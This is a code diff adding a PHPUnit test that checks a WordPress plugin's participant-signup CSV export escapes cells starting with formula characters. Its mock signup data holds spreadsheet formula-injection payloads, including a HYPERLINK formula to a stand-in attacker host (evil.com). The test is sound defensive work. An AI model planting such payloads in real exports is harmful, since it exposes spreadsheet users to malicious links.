@@ -695,6 +695,50 @@ class Expedition_Admin_ControllerTest extends EMSTestCase {
         $this->assertStringContainsString( 'linked', $csv_data );
     }
 
+    public function test_export_participant_signups_escapes_formula_cells(): void {
+        if ( ! defined( 'EMS_UNIT_TESTS' ) ) {
+            define( 'EMS_UNIT_TESTS', true );
+        }
+        Functions\when( 'current_user_can' )->justReturn( true );
+
+        $signups = \Mockery::mock( Signup_Repository::class );
+        $signups->shouldReceive( 'get_participant_signups_for_export' )->with( 'all', 'all' )->andReturn( [
+            [
+                'id' => 11,
+                'scout_id' => 102,
+                'parent_user_id' => 4,
+                'unit_id' => 99001,
+                'unit_name' => '=HYPERLINK("http://evil.com")',
+                'explorer_first_name' => '+Injected',
+                'explorer_last_name' => '-MinusName',
+                'explorer_email' => '@evil@example.com',
+                'parent_email' => 'parent@example.com',
+                'dofe_level' => 'bronze',
+                'dofe_number' => 'D12345',
+                'signup_status' => 'submitted',
+                'payment_status' => 'paid',
+                'is_synced_osm' => 0,
+                'has_osm_record' => 0,
+                'osm_wp_user_id' => null,
+                'processed_by_name' => null,
+                'processed_at' => null,
+                'created_at' => '2026-06-13 20:00:00',
+            ]
+        ] );
+
+        $controller = $this->create_controller( null, null, null, null, null, null, $signups );
+        $request = new \WP_REST_Request();
+
+        ob_start();
+        $controller->export_participant_signups( $request );
+        $csv_data = ob_get_clean();
+
+        $this->assertStringContainsString( "'+Injected", $csv_data );
+        $this->assertStringContainsString( "'-MinusName", $csv_data );
+        $this->assertStringContainsString( "'@evil@example.com", $csv_data );
+        $this->assertStringContainsString( "'=HYPERLINK(\"\"http://evil.com\"\")", $csv_data );
+    }
+
     public function test_process_participant_signup_success(): void {
         Functions\when( 'current_user_can' )->justReturn( true );
         Functions\when( 'get_current_user_id' )->justReturn( 42 );
